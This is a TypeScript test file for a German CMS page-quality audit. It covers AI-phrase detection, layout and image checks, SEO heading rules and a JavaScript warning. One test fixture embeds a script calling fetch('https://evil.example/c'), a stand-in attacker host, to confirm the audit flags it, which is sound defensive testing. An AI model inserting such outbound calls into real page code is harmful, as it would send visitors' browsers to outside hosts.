import { test } from 'node:test';
import assert from 'node:assert/strict';
import { auditSpec, findFloskeln } from '../../src/server/audit';
import { expandSpec } from '../../src/server/patterns';
import type { PageSpec } from '../../src/server/cms';

test('Floskel-Erkennung: typische KI-Phrasen ja, konkrete Texte nein', () => {
  assert.deepEqual(findFloskeln('Entdecken Sie unsere vielfältige Auswahl – Qualität, die überzeugt!'), ['Entdecken Sie …', 'Qualität, die überzeugt', 'vielfältige Auswahl']);
  assert.deepEqual(findFloskeln('Hält 3 Stunden warm – doppelwandiger Edelstahl, 0,75 l.'), []);
});

test('Qualitäts-Check meldet Floskeln, Monotonie und zu viele Farbflächen als Gestaltungspunkte', () => {
  const card = (t: string) => ({ type: 'pattern', pattern: 'benefits', data: { title: t, items: [{ title: 'a', text: 'b' }] } });
  const spec = expandSpec({
    name: 'Test', type: 'landingpage',
    sections: [{ blocks: [
      { type: 'pattern', pattern: 'hero', data: { title: 'Willkommen in der Welt des Grillens', ctaText: 'Los', ctaHref: '/x', variant: 'solid' } },
      card('Eins'), card('Zwei'), card('Drei'),
      { type: 'pattern', pattern: 'cta-banner', data: { title: 'Ende', ctaText: 'Los', ctaHref: '/y', variant: 'solid' } },
    ] }],
  } as unknown as PageSpec);
  const open = auditSpec(spec).checks.filter(c => !c.ok).map(c => c.msg).join('\n');
  assert.match(open, /Floskeln.*Willkommen in der Welt/);
  assert.match(open, /Drei gleich gebaute Abschnitte/);
  assert.match(open, /2 farbige Vollflächen/);
});

test('Audit: KI-Bild ohne sichtbaren Hinweis ist „wichtig“', async () => {
  const fs = await import('node:fs'), os = await import('node:os'), path = await import('node:path');
  process.env.AICB_DATA ??= fs.mkdtempSync(path.join(os.tmpdir(), 'lotse-test-'));
  const { stageImage, AI_CREDIT } = await import('../../src/server/media');
  const png = Buffer.from('89504e470d0a1a0a0000000d49484452000000010000000108060000001f15c4890000000d4944415478da63f8ffff3f0005fe02fea7d6a5d10000000049454e44ae426082', 'hex');
  const ai = stageImage(png, 'image/png', { alt: 'Kaffee', ai: true });
  const spec = (html: string) => ({ name: 'T', type: 'landingpage', sections: [{ blocks: [{ type: 'custom-html', html }] }] }) as unknown as PageSpec;
  const check = (html: string) => auditSpec(spec(html)).checks.find(c => /KI-(generierte )?Bilder/.test(c.msg));
  assert.equal(check(`<h1>Kaffee</h1><img src="${ai.url}" alt="Kaffee">`)?.ok, false);
  assert.equal(check(`<h1>Kaffee</h1><img src="${ai.url}" alt="Kaffee"><p>${AI_CREDIT}</p>`)?.ok, true);
  assert.equal(check('<h1>Kaffee</h1><img src="/media/foto.jpg" alt="Foto">'), undefined);
});

test('Audit: Hero ohne Bild trotz Fotos, fehlender Bild-Moment, zu viel Text', () => {
  const img = { type: 'pattern', pattern: 'split', data: { title: 'Röstung', text: 'Kurz.', imageUrl: '/media/a.jpg', imageAlt: 'Bohnen' } };
  const long = { type: 'text', html: `<p>${'Kaffee aus Hamburg geröstet. '.repeat(220)}</p>` };
  const spec = (hero: Record<string, unknown>, ...rest: unknown[]) => expandSpec({ name: 'T', type: 'landingpage', sections: [{ blocks: [{ type: 'pattern', pattern: 'hero', data: { title: 'Kaffee', ctaText: 'Los', ctaHref: '/', ...hero } }, ...rest] }] } as unknown as PageSpec);
  const msg = (a: ReturnType<typeof auditSpec>, re: RegExp) => a.checks.find(c => re.test(c.msg));
  const plain = auditSpec(spec({}, img, long));
  assert.equal(msg(plain, /Hero ohne Bild|Erster Eindruck/)?.ok, false);
  assert.equal(msg(plain, /Bild-Moment|Signatur-Moment/)?.ok, false);
  assert.equal(msg(plain, /textlastig|Bild vor Text/)?.ok, false);
  const good = auditSpec(spec({ variant: 'image', imageUrl: '/media/b.jpg', imageAlt: 'Café' }, img));
  assert.equal(msg(good, /Hero ohne Bild|Erster Eindruck/)?.ok, true);
  assert.equal(msg(good, /Bild-Moment|Signatur-Moment/)?.ok, true);
  assert.equal(msg(good, /textlastig|Bild vor Text/)?.ok, true);
});

test('HTML-Plattformen: mit theme-main (Shopify) die Theme-Regeln, ohne (Magento) die Abschnitts-Regeln', () => {
  const sections = (main: boolean) => [{ blocks: [{ type: 'text', html: '<h2>Vasen aus Keramik</h2><p>Kurzer Text.</p>' }, ...(main ? [{ type: 'theme-main' }] : [])] }];
  const shopify = auditSpec({ name: 'K', type: 'product_list', sections: sections(true) } as PageSpec, null, { format: 'html' });
  const h1s = shopify.checks.filter(c => c.area === 'SEO' && /H1/.test(c.msg) && c.w === 4);
  assert.equal(h1s.length, 1); assert.equal(h1s[0].ok, true, 'Theme-H1 zählt, keine eigene H1 nötig');
  assert.ok(shopify.checks.some(c => c.msg === 'Produkte früh erreichbar' && c.ok), 'theme-main zählt als Produktliste');
  const magento = auditSpec({ name: 'K', type: 'product_list', sections: sections(false) } as PageSpec, null, { format: 'html' });
  assert.ok(magento.checks.some(c => /Keine eigene H1/.test(c.msg) && c.ok));
  assert.ok(magento.checks.some(c => /Inhalt über der Produktliste kurz/.test(c.msg) && c.ok));
  const pdp = auditSpec({ name: 'P', type: 'product_detail', sections: [{ blocks: [{ type: 'theme-main' }, { type: 'text', html: '<p>x</p>' }] }] } as PageSpec, null, { format: 'html' });
  assert.ok(pdp.checks.some(c => c.msg === 'Galerie + Kaufbox im ersten Sichtbereich' && c.ok), 'Shopify-Produktvorlage: theme-main als Galerie/Kaufbox');
});

test('Audit: sichtbarer Text wird gegen denselben Wert geprüft, den die Meldung nennt; Meldungen ohne lange Striche', async () => {
  const { VISIBLE_MAX, auditSummary } = await import('../../src/server/audit');
  const words = (n: number) => ({ type: 'text', html: `<p>${'Wort '.repeat(n)}</p>` });
  const spec = (n: number) => ({ name: 'T', type: 'landingpage', sections: [{ blocks: [words(n)] }] }) as unknown as PageSpec;
  const check = (n: number) => auditSpec(spec(n)).checks.find(c => /textlastig|Bild vor Text/.test(c.msg))!;
  assert.equal(check(VISIBLE_MAX).ok, true);
  const over = check(VISIBLE_MAX + 20);
  assert.equal(over.ok, false); assert.match(over.msg, new RegExp(`höchstens ${VISIBLE_MAX}`));
  const a = auditSpec(spec(900), { ctx: null, internal: 0, external: 0, rewrites: new Map(), findings: [{ href: '/x', text: 'hier', level: 'wichtig', problem: 'Produkt 1 existiert nicht (mehr): Link entfernen oder ersetzen', short: 'Produkt 1 existiert nicht (mehr)' }] });
  const text = auditSummary(a) + a.checks.map(c => `${c.msg} ${c.hint ?? ''}`).join(' ') + a.warnings.join(' ');
  assert.doesNotMatch(text, /[–—]/);
  assert.match(auditSummary(a), /\[SEO, wichtig\] 1 Link\(s\) mit kaputtem.*: Link „hier“ \(\/x\): Produkt 1 existiert nicht/);
});

test('Qualitäts-Check: JavaScript im Entwurf ergibt einen wichtigen Hinweis mit den Zieladressen (alle Seitentypen)', () => {
  const blocks = [{ type: 'custom-html', html: '<div>x</div>', js: "fetch('https://evil.example/c')" }, { type: 'text', html: '<h1>Titel</h1><p>Text</p>' }];
  for (const type of ['landingpage', 'product_list', 'product_detail']) {
    const a = auditSpec({ name: 'T', type, sections: [{ blocks }] } as unknown as PageSpec);
    assert.match(a.warnings[0] ?? '', /Wichtig: .*JavaScript.*evil\.example/, type);
  }
  assert.match(auditSpec({ name: 'T', type: 'product_detail', sections: [{ blocks }] } as unknown as PageSpec, null, { format: 'html' }).warnings[0] ?? '', /JavaScript/);
  assert.ok(!auditSpec({ name: 'T', type: 'landingpage', sections: [{ blocks: [blocks[1]] }] } as unknown as PageSpec).warnings.some(w => /JavaScript/.test(w)));
});
